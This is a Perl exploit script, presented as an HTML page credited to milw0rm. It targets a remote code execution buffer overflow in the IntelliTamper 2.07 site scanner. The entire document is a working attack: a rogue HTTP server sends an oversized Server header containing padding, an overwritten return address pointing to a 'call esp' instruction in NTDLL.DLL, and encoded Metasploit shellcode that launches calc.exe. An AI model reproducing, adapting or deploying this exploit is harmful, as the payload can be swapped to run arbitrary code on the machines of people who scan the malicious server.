<html><head><title>IntelliTamper 2.07 (server header) Remote Code Execution  Exploit</title></head><pre>#!/usr/bin/perl
#
# IntelliTamper 2.07 Remote Code Execution ( server header )
#
# By: Koshi
#
# Guido Landi finally did it, thought i'd throw one in there.
# This example assumes you're scanning &quot;http://127.0.0.1&quot;
# For example, exploit may not work if you were to scan &quot;http://127.0.0.1:80&quot;
# or even changing it as slightly as &quot;http://127.0.0.1/&quot;
#
# gr33tz: Rima my baby, str0ke, messiah, Idol, old venny  ;) , BU,
# and finally, Guido Landi for sparking my interest in exploiting
# this application.
#
#

use IO::Socket;

my $msg=&quot;&quot;;
my $overflow = &quot;A&quot;x1536;
my $fun = &quot;&quot;.
	&quot;\xb3\x8d\x95\x7c&quot;. 						# EIP (0x7C958DB3      call esp NTDLL.DLL)
	&quot;z3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0C&quot;.	# More buffer.
	&quot;AAAA2Cb3Cb4CBBBB&quot;; 						# Starts executing here


# win32_exec -  EXITFUNC=seh CMD=calc.exe Size=338 Encoder=Alpha2 http://metasploit.com
my $sh3llcode =
&quot;\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49&quot;.
&quot;\x49\x49\x49\x49\x49\x49\x49\x49\x49\x37\x49\x49\x51\x5a\x6a\x63&quot;.
&quot;\x58\x30\x42\x31\x50\x42\x41\x6b\x41\x41\x73\x41\x32\x41\x41\x32&quot;.
&quot;\x42\x41\x30\x42\x41\x58\x38\x41\x42\x50\x75\x4b\x59\x59\x6c\x6a&quot;.
&quot;\x48\x70\x44\x35\x50\x65\x50\x73\x30\x6e\x6b\x33\x75\x75\x6c\x4c&quot;.
&quot;\x4b\x71\x6c\x53\x35\x74\x38\x55\x51\x78\x6f\x6e\x6b\x62\x6f\x36&quot;.
&quot;\x78\x6c\x4b\x53\x6f\x65\x70\x36\x61\x6a\x4b\x43\x79\x6e\x6b\x76&quot;.
&quot;\x54\x4e\x6b\x53\x31\x68\x6e\x64\x71\x6f\x30\x5a\x39\x4e\x4c\x6e&quot;.
&quot;\x64\x6f\x30\x71\x64\x75\x57\x78\x41\x38\x4a\x74\x4d\x76\x61\x4f&quot;.
&quot;\x32\x5a\x4b\x39\x64\x75\x6b\x43\x64\x67\x54\x74\x44\x74\x35\x48&quot;.
&quot;\x65\x6c\x4b\x73\x6f\x37\x54\x57\x71\x38\x6b\x70\x66\x6e\x6b\x64&quot;.
&quot;\x4c\x70\x4b\x4e\x6b\x33\x6f\x35\x4c\x64\x41\x38\x6b\x4c\x4b\x37&quot;.
&quot;\x6c\x4c\x4b\x76\x61\x58\x6b\x6c\x49\x43\x6c\x55\x74\x56\x64\x4f&quot;.
&quot;\x33\x44\x71\x4f\x30\x30\x64\x6c\x4b\x77\x30\x74\x70\x6f\x75\x49&quot;.
&quot;\x50\x50\x78\x36\x6c\x4c\x4b\x33\x70\x54\x4c\x6e\x6b\x30\x70\x45&quot;.
&quot;\x4c\x6e\x4d\x4c\x4b\x55\x38\x43\x38\x78\x6b\x44\x49\x6e\x6b\x4b&quot;.
&quot;\x30\x6c\x70\x45\x50\x65\x50\x75\x50\x4c\x4b\x41\x78\x75\x6c\x51&quot;.
&quot;\x4f\x30\x31\x7a\x56\x51\x70\x30\x56\x4f\x79\x38\x78\x6c\x43\x6b&quot;.
&quot;\x70\x71\x6b\x72\x70\x61\x78\x4a\x50\x4d\x5a\x43\x34\x43\x6f\x43&quot;.
&quot;\x58\x4c\x58\x49\x6e\x6c\x4a\x66\x6e\x43\x67\x69\x6f\x48\x67\x43&quot;.
&quot;\x53\x73\x51\x50\x6c\x41\x73\x66\x4e\x70\x65\x72\x58\x71\x75\x37&quot;.
&quot;\x70\x63&quot;;

my $overflow2 = &quot;A&quot;x1046;
my $buff = &quot;$overflow$fun$sh3llcode&quot;;
my $resp = &quot;&quot;.
	&quot;HTTP/1.1 200 OK\r\n&quot;.
	&quot;Connection: close\r\n&quot;.
	&quot;Content-Length: 8\r\n&quot;.
	&quot;Date: Mon, 21 Jul 2008 20:47:05 GMT\r\n&quot;.
	&quot;Content-Type: text/plain\r\n&quot;.
	&quot;Server: $buff\r\n&quot;.
	&quot;MIME-Version: 1.0\r\n\r\n&quot;.
	&quot;Exploit!\r\n&quot;;

my $sock = new IO::Socket::INET (LocalPort =&gt; '80', Proto =&gt; 'tcp', Listen =&gt; 1, Reuse =&gt; 1, );


print &quot;Listening on port 80 for connections...\n&quot;;
my $new_sock = $sock-&gt;accept();
print &quot;Got connection from client...\n&quot;;
my $sock_addr = recv($new_sock,$msg,190,0);
print &quot;Sending client packet...\n&quot;;
print $new_sock &quot;$resp&quot;;
print &quot;Packet sent to client, voila?\n&quot;;
close($sock);
print &quot;Socket closed\n&quot;;

# milw0rm.com [2008-07-22]</pre></html>